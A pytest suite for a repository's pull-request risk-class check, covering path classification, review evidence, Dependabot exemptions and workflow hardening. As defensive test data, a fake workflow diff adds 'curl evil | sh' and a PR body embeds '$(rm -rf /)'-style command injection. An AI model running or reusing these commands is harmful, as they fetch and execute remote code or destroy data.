"""The risk-class check (scripts/risk_class.py, mapping .github/risk-paths.toml,
.github/workflows/risk.yml). Pure: no database, no network; git is read only by the guards
that list the tracked files.

Owner decisions of 19 November 2026: a file-based minimum risk class that every pull request
declares; for High, the design note and the review record must exist and be current. The
Makefile is High (M1); there is no per-PR exception (M2); Dependabot is exempt only for
dependency files and workflow pins (M3); the job reports only until the owner requires it
(M4); a review is stale once a High path of the pull request changed after it (M6).

The guards at the end keep the mapping honest against the existing classifications rather
than a second list: every API module whose own test is in CRITICAL_PY (read with
test_test_tiers.make_words) maps to High, and an excepted module holds no High trait.
"""

from __future__ import annotations

import ast
import importlib.util
import random
import re
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path, PurePosixPath
from types import ModuleType
from typing import Any

import pytest
from test_test_tiers import make_words

ROOT = Path(__file__).resolve().parents[3]


def _load(name: str) -> ModuleType:
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / f"{name}.py")
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module  # its dataclasses look their module up by name
    spec.loader.exec_module(module)
    return module


rc: Any = _load("risk_class")
MAPPING_TEXT = (ROOT / ".github" / "risk-paths.toml").read_text(encoding="utf-8")
MAPPING = rc.parse_mapping(MAPPING_TEXT)
TEMPLATE = (ROOT / ".github" / "pull_request_template.md").read_text(encoding="utf-8")
INVARIANTS = (ROOT / "docs" / "audit-invariants.md").read_text(encoding="utf-8")
LOW, MEDIUM, HIGH = rc.LOW, rc.MEDIUM, rc.HIGH
BASE = "b" * 40
HEAD = "c" * 40
FIRST = "a1" * 20
SECOND = "a2" * 20
API = "services/api/ai_workforce_api"


def _level(path: str, mapping: Any = MAPPING) -> int:
    level: int = rc.classify(path, mapping)[0]
    return level


@dataclass
class FakeRepo:
    """What GitRepo reads, as data. Commits run newest first: HEAD, SECOND, FIRST."""

    changed: list[Any] = field(default_factory=list)
    files: dict[tuple[str, str], str] = field(default_factory=dict)
    history: list[str] = field(default_factory=lambda: [HEAD, SECOND, FIRST])
    after: dict[str, list[str]] = field(default_factory=dict)
    tracked_files: list[str] = field(default_factory=list)
    diffs: dict[str, str] = field(default_factory=dict)

    def __post_init__(self) -> None:
        for rev in (BASE, HEAD):
            self.files.setdefault((rev, rc.MAPPING_PATH), MAPPING_TEXT)
        self.files.setdefault((HEAD, rc.INVARIANTS_PATH), INVARIANTS)

    def show(self, rev: str, path: str) -> str | None:
        return self.files.get((rev, path))

    def changes(self, base: str, head: str) -> list[Any]:
        return list(self.changed)

    def commits(self, base: str, head: str) -> list[str]:
        return self.history[self.history.index(head) :] if head in self.history else []

    def changed_between(self, older: str, newer: str) -> list[str]:
        return self.after.get(older, [])

    def tracked(self, rev: str) -> list[str]:
        return self.tracked_files

    def file_diff(self, base: str, head: str, path: str) -> str:
        return self.diffs.get(path, "")


def _changes(*entries: str) -> list[Any]:
    """'M path', 'R old new', ..."""
    found = []
    for entry in entries:
        status, *paths = entry.split()
        found.append(rc.Change(status, tuple(paths)))
    return found


WORDS = " ".join(f"word{n}" for n in range(60))
INLINE = (
    f"Design-note: inline\n\n### What could go wrong\n{WORDS}\n\n### What happens later\n{WORDS}\n"
)
REVIEW = (
    f"Reviewed-commit: {SECOND[:9]}\nReviewer: agent review (wf_1)\nVerdict: SHIP\nFindings: none\n"
)


def _body(
    declared: str | None = "High",
    note: str = INLINE,
    invariants: str = "I1, I2: the sign-off basis",
    review: str = REVIEW,
) -> str:
    """The real PR template, ticked and filled in: the parser and the template agree."""
    text = TEMPLATE
    if declared is not None:
        text = text.replace(f"- [ ] {declared}:", f"- [x] {declared}:", 1)
    text = re.sub(r"^Design-note: .*\n\n### What could go wrong\n\n### What happens later\n",
                  lambda _: note, text, flags=re.MULTILINE)  # fmt: skip
    text = text.replace(
        "## Audit invariants touched (docs/audit-invariants.md)\n",
        f"## Audit invariants touched (docs/audit-invariants.md)\n\n{invariants}\n",
    )
    fields = re.compile(r"^Reviewed-commit: .*\nReviewer: .*\nVerdict: .*\nFindings: .*\n", re.M)
    return fields.sub(lambda _: review, text)


def _run(repo: FakeRepo, body: str, author: str = "someone") -> Any:
    return rc.evaluate(repo, BASE, HEAD, body, author)


# --- Classification rules ----------------------------------------------------------------

EXPECTED = {
    HIGH: [
        "migrations/0001_conventions.sql", f"{API}/testing_engine.py",
        f"{API}/demo_northstar/lifecycle.py", ".github/workflows/ci.yml",
        ".github/workflows/risk.yml", ".github/risk-paths.toml", "scripts/risk_class.py",
        ".gitleaksignore", "Makefile", "scripts/reset.sh", "scripts/backup.sh",
        "scripts/review_guard.py", "scripts/scratch_stack.py", "apps/web/proxy.ts",
        "apps/web/src/origin-guard.ts", "apps/web/next.config.ts", "apps/web/src/portal-api.ts",
        ".env.example", "docker-compose.yml", "AGENTS.md", ".claude/agents/ui-reviewer.md",
    ],
    MEDIUM: [
        "apps/web/app/api/controls/route.ts", "apps/web/app/page.tsx",
        "apps/web/src/sheet-model.ts", "package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml",
        "uv.lock", "pyproject.toml", "services/api/pyproject.toml", "apps/web/package.json",
        "scripts/run_tests.py", "scripts/changed_tests.py", "scripts/test_durations.json",
        ".github/pull_request_template.md", ".github/dependabot.yml",
        "docs/engineering-standards.md", "docs/test-strategy.md", "docs/audit-invariants.md",
        "docs/test-baseline.md", "biome.json", "tsconfig.json", ".gitattributes", ".gitignore",
        ".npmrc", ".node-version", ".python-version", "services/api/evals/cases.json",
        f"{API}/definitions_itgc.py", f"{API}/slot_options.py",
    ],
    LOW: [
        "apps/web/src/control-view.tsx", "apps/web/app/globals.css",
        "apps/web/public/welcome/a.webp", "apps/web/next-env.d.ts",
        "services/api/tests/test_policy.py", "tests/test_smoke.py", "tests/sheet-model.test.ts",
        "docs/decisions/0001.md", "docs/review/a/b.png", "README.md", "apps/web/AGENTS.md",
    ],
}  # fmt: skip


@pytest.mark.parametrize(
    ("path", "level"), [(path, level) for level, paths in EXPECTED.items() for path in paths]
)
def test_each_rule_gives_its_class(path: str, level: int) -> None:
    assert rc.explicitly_matched(path, MAPPING), path
    assert _level(path) == level, (path, rc.classify(path, MAPPING))


def test_the_highest_matching_rule_wins_whatever_the_order() -> None:
    paths = [path for paths in EXPECTED.values() for path in paths]
    expected = [_level(path) for path in paths]
    rules = list(MAPPING.rules)
    for seed in range(5):
        random.Random(seed).shuffle(rules)
        shuffled = rc.Mapping(MAPPING.default, tuple(rules))
        assert [_level(path, shuffled) for path in paths] == expected


def test_except_removes_a_path_from_that_rule_only() -> None:
    assert _level(f"{API}/definitions_itgc.py") == MEDIUM
    assert _level(f"{API}/definitions.py") == HIGH  # not definitions_*
    assert _level(f"{API}/control_conclusions.py") == HIGH


def test_a_single_star_stays_in_its_segment_and_a_double_star_spans() -> None:
    assert _level("apps/web/src/sheet-model.ts") == MEDIUM
    assert not rc.explicitly_matched("apps/web/src/nested/sheet-model.ts", MAPPING)
    assert _level("apps/web/src/nested/sheet-model.ts") == HIGH  # the default
    assert _level("apps/web/src/a/b.tsx") == LOW
    mapping = rc.parse_mapping('version = 1\ndefault = "High"\n[[rule]]\nclass = "Low"\n'
                               'why = "x"\npaths = ["a/*.tsx"]\n')  # fmt: skip
    assert _level("a/b.tsx", mapping) == LOW
    assert _level("a/b/c.tsx", mapping) == HIGH


def test_an_unknown_path_is_high_by_default() -> None:
    for path in ("LICENSE", "newtool/config.yaml", "services/api/new_package/x.py"):
        assert not rc.explicitly_matched(path, MAPPING)
        assert _level(path) == HIGH


# --- Escalation --------------------------------------------------------------------------


def test_one_high_path_among_fifty_low_ones_makes_the_pull_request_high() -> None:
    changes = _changes(*[f"M docs/note{n}.md" for n in range(50)], "M migrations/0200_x.sql")
    report = _run(FakeRepo(changes), _body("Low"))
    assert report.computed == HIGH
    assert ("migrations/0200_x.sql", "§2 High: a migration or stored data") in report.deciding


def test_a_pull_request_whose_only_high_file_is_the_mapping_is_high() -> None:
    report = _run(FakeRepo(_changes("M .github/risk-paths.toml", "M docs/a.md")), _body())
    assert report.computed == HIGH


def test_a_head_mapping_cannot_lower_its_own_pull_request() -> None:
    lowered = MAPPING_TEXT.replace('why = "§2 High: a migration', 'why = "lowered: a migration', 1)
    lowered = lowered.replace('class = "High"\nwhy = "lowered', 'class = "Low"\nwhy = "lowered', 1)
    assert lowered != MAPPING_TEXT
    repo = FakeRepo(
        _changes("M .github/risk-paths.toml", "M migrations/0001_conventions.sql"),
        files={(HEAD, rc.MAPPING_PATH): lowered},
        tracked_files=["migrations/0001_conventions.sql", "migrations/0002_x.sql", "docs/a.md"],
    )
    report = _run(repo, _body("Low"))
    assert report.computed == HIGH
    assert report.lowered == ["migrations/0001_conventions.sql", "migrations/0002_x.sql"]
    assert any("declared Low, the paths require High" in f for f in report.failures)
    assert any("lowers 2 tracked files" in line for line in rc.render(report))


def test_each_path_takes_the_higher_of_the_base_and_head_mappings() -> None:
    # The mapping differs between base and head although this pull request does not change
    # it (main tightened it after the branch point): the higher class counts, either way.
    low = MAPPING_TEXT.replace('default = "High"', 'default = "Low"', 1).replace(
        'class = "High"\nwhy = "§2 High: a migration',
        'class = "Low"\nwhy = "§2 High: a migration',
        1,
    )
    assert 'default = "Low"' in low and 'class = "Low"\nwhy = "§2 High: a migration' in low
    changes = _changes("M migrations/0001_conventions.sql", "A newtool/x.yaml")
    for side in (HEAD, BASE):
        report = _run(FakeRepo(changes, files={(side, rc.MAPPING_PATH): low}), _body("Low"))
        assert report.computed == HIGH, side
        assert (
            "migrations/0001_conventions.sql",
            "§2 High: a migration or stored data",
        ) in report.deciding
        assert any("declared Low, the paths require High" in f for f in report.failures)
        assert report.lowered == []  # step 3 did not run: the mapping is not in the diff


def test_an_empty_diff_is_low() -> None:
    report = _run(FakeRepo([]), _body("Low"))
    assert (report.computed, report.effective, report.failures) == (LOW, LOW, [])


# --- Renames, copies, deletes, mode changes ----------------------------------------------


@pytest.mark.parametrize(
    ("entry", "level"),
    [
        ("R migrations/0001_conventions.sql docs/0001_conventions.sql", HIGH),
        ("R docs/a.md docs/b.md", LOW),
        ("C migrations/0001_conventions.sql docs/copy.sql", HIGH),
        ("D migrations/0001_conventions.sql", HIGH),
        ("D services/api/tests/test_x.py", MEDIUM),
        ("D tests/x.test.ts", MEDIUM),
        ("R services/api/tests/test_x.py docs/test_x.py", MEDIUM),
        ("R services/api/tests/test_x.py services/api/tests/test_y.py", LOW),
        ("D docs/a.md", LOW),
        ("T scripts/reset.sh", HIGH),
        ("T docs/a.md", LOW),
    ],
)
def test_a_change_counts_every_name_it_touches(entry: str, level: int) -> None:
    (change,) = _changes(entry)
    assert rc.change_level(change, [MAPPING])[0] == level


def test_the_git_name_status_output_is_read_with_both_names_of_a_rename() -> None:
    text = "M\0docs/a.md\0R100\0migrations/x.sql\0docs/x.sql\0C075\0a b.txt\0c.txt\0D\0t.py\0"
    assert rc.parse_name_status(text) == [
        rc.Change("M", ("docs/a.md",)),
        rc.Change("R", ("migrations/x.sql", "docs/x.sql")),
        rc.Change("C", ("a b.txt", "c.txt")),
        rc.Change("D", ("t.py",)),
    ]
    with pytest.raises(ValueError):
        rc.parse_name_status("R100\0only-one-name\0")


# --- Declarations ------------------------------------------------------------------------


def test_a_missing_declaration_fails_with_its_fix() -> None:
    repo = FakeRepo(_changes("M docs/a.md"))
    for body in ("", "## What and why\nA change.\n", TEMPLATE):
        report = _run(repo, body)
        assert report.declared is None
        assert any(f.startswith("Declaration: Missing") and "Fix:" in f for f in report.failures)


def test_a_malformed_declaration_fails_and_x_in_either_case_is_a_tick() -> None:
    repo = FakeRepo(_changes("M docs/a.md"))
    two = _body("Low").replace("- [ ] Medium:", "- [X] Medium:")
    assert any("2 boxes ticked" in f for f in _run(repo, two).failures)
    no_word = "## Risk class\n- [x] something else\n"
    assert any("names no class" in f for f in _run(repo, no_word).failures)
    assert _run(repo, "## Risk class\n- [X] Low: and any text after\n").declared == LOW
    commented = "## Risk class\n<!-- - [x] High -->\n- [ ] Low\n"
    assert _run(repo, commented).declared is None


def test_declaring_above_the_minimum_takes_the_declared_class_and_its_evidence() -> None:
    repo = FakeRepo(_changes("M docs/a.md"))
    passing = _run(repo, _body("High"))
    assert (passing.computed, passing.effective, passing.failures) == (LOW, HIGH, [])
    bare = "## Risk class\n- [x] High: a public contract\n"
    failing = _run(repo, bare)
    assert failing.effective == HIGH
    assert {f.split(":", 1)[0] for f in failing.failures} == {"Design note", "Invariants", "Review"}


def test_declaring_below_the_minimum_fails_and_names_five_deciding_paths() -> None:
    changes = _changes(*[f"M migrations/0{n}00_x.sql" for n in range(1, 8)], "M docs/a.md")
    report = _run(FakeRepo(changes), _body("Medium"))
    assert any("declared Medium, the paths require High" in f for f in report.failures)
    assert len(report.deciding) == 5
    assert all(why == "§2 High: a migration or stored data" for _path, why in report.deciding)


def test_there_is_no_per_pull_request_exception() -> None:
    # Owner decision M2: neither a reason line nor any other text lowers the minimum.
    body = _body("Low") + "\nRisk-exception: approved by the owner, 19 November 2026\n"
    report = _run(FakeRepo(_changes("M migrations/0001_conventions.sql")), body)
    assert any("declared Low, the paths require High" in f for f in report.failures)


# --- High evidence -----------------------------------------------------------------------

NOTE = "docs/decisions/0010-risk.md"


@pytest.mark.parametrize(
    ("note", "files", "problem"),
    [
        ("", {}, "missing or still a placeholder"),
        ("Design-note: <a docs/ path>\n", {}, "missing or still a placeholder"),
        (f"Design-note: {NOTE}\n", {}, "is not in the head commit"),
        ("Design-note: private/design.md\n", {}, "git-ignored, so the check cannot see it"),
        ("Design-note: inlined.md\n", {}, "not a Markdown file under docs/"),
        ("Design-note: docs/note.txt\n", {}, "not a Markdown file under docs/"),
        (f"Design-note: {NOTE}\n", {NOTE: "too short " * 10}, "has 20 words"),
        ("Design-note: inline\n### What could go wrong\nshort\n", {}, "has 1 words"),
        ("Design-note: inline\n", {}, "'### What could go wrong' is missing"),
        ("Design-note: private (owner-held), summary below\n", {}, "is missing"),
        (f"Design-note: {NOTE}\nDesign-note: inline\n", {}, "given more than once"),
    ],
)
def test_a_high_design_note_must_exist(note: str, files: dict[str, str], problem: str) -> None:
    repo = FakeRepo(_changes("M Makefile"), files={(HEAD, p): t for p, t in files.items()})
    report = _run(repo, _body(note=note))
    notes = [f for f in report.failures if f.startswith("Design note")]
    assert notes and problem in notes[0], notes


def test_a_valid_note_path_an_inline_note_or_a_private_summary_passes() -> None:
    long_note = " ".join(["word"] * 160)
    repo = FakeRepo(_changes("M Makefile"), files={(HEAD, NOTE): long_note})
    private = INLINE.replace("inline", "private (owner-held), summary below")
    for note in (f"Design-note: `{NOTE}`\n", INLINE, private):
        assert _run(repo, _body(note=note)).failures == [], note


@pytest.mark.parametrize(
    ("invariants", "problem"),
    [
        ("", "missing or empty"),
        ("I99: not an invariant", "I99 not in docs/audit-invariants.md"),
        ("none", "gives no reason"),
        ("Nothing in particular", "no invariant id named"),
    ],
)
def test_a_high_change_names_known_invariants(invariants: str, problem: str) -> None:
    report = _run(FakeRepo(_changes("M Makefile")), _body(invariants=invariants))
    found = [f for f in report.failures if f.startswith("Invariants")]
    assert found and problem in found[0], found


def test_known_invariants_or_none_with_a_reason_pass() -> None:
    repo = FakeRepo(_changes("M Makefile"))
    for invariants in ("I1, I14 and I16: the gate's own lists", "none: the CI configuration only"):
        assert _run(repo, _body(invariants=invariants)).failures == [], invariants


def _record(commit: str = SECOND[:9], verdict: str = "SHIP", reviewer: str = "agent (wf_1)",
            findings: str = "none") -> str:  # fmt: skip
    return (
        f"Reviewed-commit: {commit}\nReviewer: {reviewer}\n"
        f"Verdict: {verdict}\nFindings: {findings}\n"
    )


@pytest.mark.parametrize(
    ("review", "problem"),
    [
        (_record(commit="d" * 40), "is not a commit of this pull request"),
        (_record(commit="<the SHA>"), "Reviewed-commit is missing or still a placeholder"),
        (_record(verdict="FIX FIRST"), "not SHIP"),
        (_record(reviewer=""), "Reviewer is missing"),
        (_record(findings=f"B1 fixed in {HEAD[:8]}"), f"the fix {HEAD[:8]} is not in the reviewed"),
        (_record() + "Verdict: SHIP\n", "Verdict is given more than once"),
        ("", "Reviewed-commit is missing"),
    ],
)
def test_a_high_review_record_must_be_well_formed(review: str, problem: str) -> None:
    report = _run(FakeRepo(_changes("M Makefile")), _body(review=review))
    found = [f for f in report.failures if f.startswith("Review")]
    assert any(problem in f for f in found), found


def test_a_review_is_stale_once_a_high_path_of_the_pull_request_changed_after_it() -> None:
    # Owner decision M6. A Low path changed after the review, or a High path the pull request
    # does not change (main merged in), leaves it current.
    changes = _changes("M Makefile", "M docs/a.md")
    stale = FakeRepo(changes, after={SECOND: ["Makefile", "docs/a.md"]})
    assert any("1 High paths changed after the review" in f for f in _run(stale, _body()).failures)
    low_only = FakeRepo(changes, after={SECOND: ["docs/a.md", "migrations/0300_from_main.sql"]})
    assert _run(low_only, _body()).failures == []
    fixed = _record(findings=f"B1 fixed in {FIRST[:7]}; B2 fixed in {SECOND[:10]}")
    assert _run(FakeRepo(changes), _body(review=fixed)).failures == []


def test_a_review_is_stale_when_either_mapping_makes_the_changed_path_high() -> None:
    # The staleness check uses the same higher-of-both rule as the class: a mapping that
    # differs between base and head (the pull request does not change it) cannot make a
    # High path changed after the review look Low.
    low = MAPPING_TEXT.replace(
        'class = "High"\nwhy = "§2 High: a migration',
        'class = "Low"\nwhy = "§2 High: a migration',
        1,
    )
    assert low != MAPPING_TEXT
    changes = _changes("M migrations/0001_conventions.sql", "M docs/a.md")
    after = {SECOND: ["migrations/0001_conventions.sql"]}
    for side in (HEAD, BASE):
        repo = FakeRepo(changes, files={(side, rc.MAPPING_PATH): low}, after=after)
        failures = _run(repo, _body()).failures
        assert any("1 High paths changed after the review" in f for f in failures), side


# --- Bots --------------------------------------------------------------------------------

PIN = "@@ -1 +1 @@\n-      uses: a/b@111 # v1\n+      uses: a/b@222 # v2\n"


def test_dependabot_needs_no_declaration_for_dependency_files_or_workflow_pins() -> None:
    repo = FakeRepo(
        _changes("M pnpm-lock.yaml", "M package.json", "M .github/workflows/ci.yml"),
        diffs={".github/workflows/ci.yml": PIN},
    )
    report = _run(repo, "", author=rc.DEPENDABOT)
    assert report.exempt and report.failures == [] and report.computed == HIGH
    assert any("No declaration needed" in line for line in rc.render(report))


@pytest.mark.parametrize(
    ("entries", "diff"),
    [
        (["M .github/workflows/ci.yml"], PIN + "+      run: curl evil | sh\n"),
        (["M pnpm-lock.yaml", "M scripts/run_tests.py"], PIN),
        (["A package.json"], PIN),
        (["M .github/workflows/ci.yml"], ""),
        (["M .github/risk-paths.toml"], PIN),
    ],
)
def test_any_other_dependabot_change_is_handled_as_any_pull_request(
    entries: list[str], diff: str
) -> None:
    repo = FakeRepo(_changes(*entries), diffs={".github/workflows/ci.yml": diff})
    report = _run(repo, "", author=rc.DEPENDABOT)
    assert report.exempt is None
    assert any(f.startswith("Declaration: Missing") for f in report.failures)
    # Another author changing only pins is never exempt.
    assert _run(FakeRepo(_changes("M pnpm-lock.yaml")), "", author="someone").exempt is None


def test_dependabot_is_exempt_only_where_both_the_base_and_head_mappings_exempt_it() -> None:
    # The stricter mapping decides: a file one side no longer exempts (it falls to the High
    # default), or a workflow one side marks "pins", is handled as any pull request is.
    no_lock = MAPPING_TEXT.replace('    "pnpm-lock.yaml",\n', "", 1)
    assert rc.classify("pnpm-lock.yaml", rc.parse_mapping(no_lock))[0] == HIGH
    any_pin = MAPPING_TEXT.replace('dependabot = "pins"', 'dependabot = "any"', 1)
    assert any_pin != MAPPING_TEXT
    unpinned = {".github/workflows/ci.yml": PIN + "+      run: curl evil | sh\n"}
    assert _run(FakeRepo(_changes("M pnpm-lock.yaml")), "", author=rc.DEPENDABOT).exempt
    for side in (HEAD, BASE):
        cases = [
            FakeRepo(_changes("M pnpm-lock.yaml"), files={(side, rc.MAPPING_PATH): no_lock}),
            FakeRepo(_changes("M .github/workflows/ci.yml"), diffs=unpinned,
                     files={(side, rc.MAPPING_PATH): any_pin}),
        ]  # fmt: skip
        for repo in cases:
            report = _run(repo, "", author=rc.DEPENDABOT)
            assert report.exempt is None, (side, repo.changed)
            assert any(f.startswith("Declaration: Missing") for f in report.failures)


# --- The body is data; the output is bounded ---------------------------------------------


def test_a_hostile_or_huge_body_is_parsed_as_data_in_bounded_time() -> None:
    hostile = _body("Low").replace("## What and why", "## What and why\n$(rm -rf /) `id` ${{ x }}")
    assert _run(FakeRepo(_changes("M docs/a.md")), hostile).failures == []
    start = time.perf_counter()
    huge = "<!--" * 250_000 + "\n- [x] High\n" + "x" * 1_000_000
    for body in (huge, "## Risk class\n" + "- [ ] Low\n" * 100_000):
        assert _run(FakeRepo(_changes("M docs/a.md")), body).declared is None
    assert time.perf_counter() - start < 5


def test_the_output_is_at_most_twenty_lines_and_every_failure_names_its_fix() -> None:
    changes = _changes(*[f"M migrations/0{n}_x.sql" for n in range(10)])
    report = _run(FakeRepo(changes), "## Risk class\n- [x] Low\n")
    report.failures += [f"Extra: problem {n}. Fix: fix {n}" for n in range(30)]
    lines = rc.render(report, report_only=True)
    assert len(lines) <= 20
    assert lines[0] == "Risk class: FAIL (report only: not enforced)"
    assert lines[-1].startswith("- ... and ")
    assert all("Fix:" in f for f in report.failures)


def test_main_exits_1_on_a_failure_unless_report_only(monkeypatch: pytest.MonkeyPatch) -> None:
    repo = FakeRepo(_changes("M Makefile"))
    monkeypatch.setattr(rc, "GitRepo", lambda _root: repo)
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)
    monkeypatch.setenv("AUTHOR", "someone")
    monkeypatch.setenv("BODY", "")
    args = ["--base", BASE, "--head", HEAD]
    assert rc.main(args) == 1
    assert rc.main([*args, "--report-only"]) == 0
    monkeypatch.setenv("BODY", _body())
    assert rc.main(args) == 0


def test_a_mapping_in_neither_commit_fails_closed() -> None:
    repo = FakeRepo(_changes("M docs/a.md"))
    repo.files = {}
    report = _run(repo, _body("Low"))
    assert report.effective == HIGH and report.failures[0].startswith("Mapping:")


# --- The mapping file is well formed -----------------------------------------------------

_RULE = '[[rule]]\nclass = "Low"\nwhy = "x"\npaths = ["docs/**"]\n'


@pytest.mark.parametrize(
    ("text", "problem"),
    [
        ('version = 2\ndefault = "High"\n' + _RULE, "version must be 1"),
        ('version = 1\ndefault = "Critical"\n' + _RULE, "is not one of"),
        ('version = 1\ndefault = "High"\nextra = 1\n' + _RULE, "unknown top-level keys"),
        ('version = 1\ndefault = "High"\n', "no [[rule]] entries"),
        ('version = 1\ndefault = "High"\n' + _RULE.replace('"x"', '" "'), "non-empty `why`"),
        ('version = 1\ndefault = "High"\n' + _RULE.replace('["docs/**"]', "[]"), "glob strings"),
        ('version = 1\ndefault = "High"\n' + _RULE + "owner = 1\n", "unknown keys"),
        ('version = 1\ndefault = "High"\n' + _RULE + 'except = ["src/a.py"]\n', "outside"),
        ('version = 1\ndefault = "High"\n' + _RULE + 'dependabot = "all"\n', "dependabot"),
        ("version = = 1", "not valid TOML"),
    ],
)
def test_a_malformed_mapping_is_refused(text: str, problem: str) -> None:
    with pytest.raises(rc.MappingError, match=re.escape(problem)):
        rc.parse_mapping(text)


def test_the_repository_mapping_is_version_1_with_a_high_default() -> None:
    assert MAPPING.default == HIGH
    assert {rule.level for rule in MAPPING.rules} == {LOW, MEDIUM, HIGH}
    makefile = [rule for rule in MAPPING.rules if "Makefile" in rule.paths]
    assert [rule.level for rule in makefile] == [HIGH]  # owner decision M1


# --- Guards: the mapping against the repository and the existing classifications --------


def _tracked() -> list[str]:
    out = subprocess.run(
        ["git", "ls-files", "-z"], cwd=ROOT, check=True, capture_output=True, text=True
    ).stdout
    files = [path for path in out.split("\0") if path]
    assert len(files) > 1000, "git ls-files listed the repository"
    return files


TRACKED = _tracked()


def test_every_tracked_file_matches_an_explicit_rule() -> None:
    # The default is for a genuinely new location; the pull request that adds one
    # classifies it here.
    unmatched = [path for path in TRACKED if not rc.explicitly_matched(path, MAPPING)]
    assert unmatched == [], f"add a rule to .github/risk-paths.toml for: {unmatched[:20]}"


def test_every_api_module_whose_own_test_is_critical_is_high() -> None:
    # The critical tier is the existing classification of what must never break: a module
    # whose own test file is in CRITICAL_PY is never below High.
    modules = []
    for entry in make_words("CRITICAL_PY"):
        found = re.fullmatch(r"services/api/tests/test_(\w+)\.py", entry)
        if found and (ROOT / API / f"{found.group(1)}.py").is_file():
            modules.append(f"{API}/{found.group(1)}.py")
    assert len(modules) > 60
    assert [m for m in modules if _level(m) != HIGH] == []


_TRAITS = {
    "an SQL write": re.compile(r"\bINSERT\s+INTO\b|\bUPDATE\s+\w+\s+SET\b|\bDELETE\s+FROM\b", re.I),
    "a route": re.compile(r"APIRouter\(|@\w+\.(?:get|post|put|patch|delete|api_route|websocket)\("),
    "a prompt": re.compile(r"PROMPT_VERSION|SYSTEM_PROMPT"),
    "a process or mail call": re.compile(r"\bsubprocess\b|\bsmtp", re.I),
}
_MODEL_MODULES = {"models", "model_providers", "agent_answers"}


def _imports(source: str) -> set[str]:
    found: set[str] = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            found |= {alias.name.split(".")[-1] for alias in node.names}
        elif isinstance(node, ast.ImportFrom):
            found.add((node.module or "").split(".")[-1])
            found |= {alias.name for alias in node.names}
    return found


def test_an_excepted_api_module_holds_no_high_trait() -> None:
    critical = set(make_words("CRITICAL_PY"))
    excepted = [
        path
        for path in TRACKED
        for rule in MAPPING.rules
        if any(PurePosixPath(path).full_match(glob) for glob in rule.excepted)
    ]
    assert len(excepted) >= 10
    problems = []
    for path in excepted:
        source = (ROOT / path).read_text(encoding="utf-8")
        problems += [f"{path}: {trait}" for trait, rx in _TRAITS.items() if rx.search(source)]
        if _imports(source) & _MODEL_MODULES:
            problems.append(f"{path}: a model call ({sorted(_imports(source) & _MODEL_MODULES)})")
        own = f"services/api/tests/test_{Path(path).stem}.py"
        if own in critical:
            problems.append(f"{path}: its own test is in CRITICAL_PY")
    assert problems == []


def test_the_trait_guard_sees_each_trait() -> None:
    for source in ("cur.execute('insert into x values (1)')", "router = APIRouter()",
                   "@router.post('/x')", "PROMPT_VERSION = 3", "import subprocess",
                   "import smtplib", "UPDATE tasks SET done = true"):  # fmt: skip
        assert any(rx.search(source) for rx in _TRAITS.values()), source
    assert _imports("from . import models\n") & _MODEL_MODULES
    assert _imports("from .agent_answers import generate\n") & _MODEL_MODULES
    assert _imports("from ai_workforce_api.model_providers import x\n") & _MODEL_MODULES


def test_every_except_entry_names_a_tracked_file() -> None:
    dead = [
        glob
        for rule in MAPPING.rules
        for glob in rule.excepted
        if not any(PurePosixPath(path).full_match(glob) for path in TRACKED)
    ]
    assert dead == []


def test_the_dependency_rule_is_the_set_security_yml_audits() -> None:
    workflow = (ROOT / ".github" / "workflows" / "security.yml").read_text(encoding="utf-8")
    found = re.search(r"grep -qE '\^\((.*)\)\$'", workflow)
    assert found is not None
    audited = {part.replace("\\.", ".") for part in found.group(1).split("|")}
    (rule,) = [rule for rule in MAPPING.rules if rule.dependabot == "any"]
    assert set(rule.paths) == audited


def test_changing_the_check_selects_this_guard() -> None:
    ct = _load("changed_tests")
    guards = ct.GUARDS
    mine = "services/api/tests/test_risk_class.py"
    for path in (".github/risk-paths.toml", "scripts/risk_class.py", ".github/workflows/risk.yml",
                 ".github/pull_request_template.md"):  # fmt: skip
        assert mine in guards[path], path
    assert "tests/test_smoke.py" in guards[".github/workflows/risk.yml"]
    assert mine in make_words("CRITICAL_PY")


def test_the_workflow_runs_the_base_script_report_only_with_read_permissions() -> None:
    workflow = (ROOT / ".github" / "workflows" / "risk.yml").read_text(encoding="utf-8")
    ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
    assert 'git show "$BASE_SHA:scripts/risk_class.py"' in workflow
    assert "python -I" in workflow and "--report-only" in workflow  # owner decision M4
    assert re.search(r"^permissions:\n  contents: read\n\n", workflow, re.MULTILINE)
    assert "types: [opened, edited, synchronize, reopened, ready_for_review]" in workflow
    assert "BODY: ${{ github.event.pull_request.body }}" in workflow
    run = workflow.split("run: |", 1)[1]
    assert "${{" not in run, "event data reaches the script through env only"
    for pin in re.findall(r"uses: (\S+@[0-9a-f]{40})", workflow):
        assert pin in ci, f"{pin} is pinned as ci.yml pins it"
    assert "fetch-depth: 0" in workflow and "timeout-minutes: 3" in workflow
